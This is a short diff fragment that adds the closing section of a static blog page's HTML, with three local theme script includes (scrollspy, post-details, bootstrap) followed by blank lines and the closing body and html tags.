+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
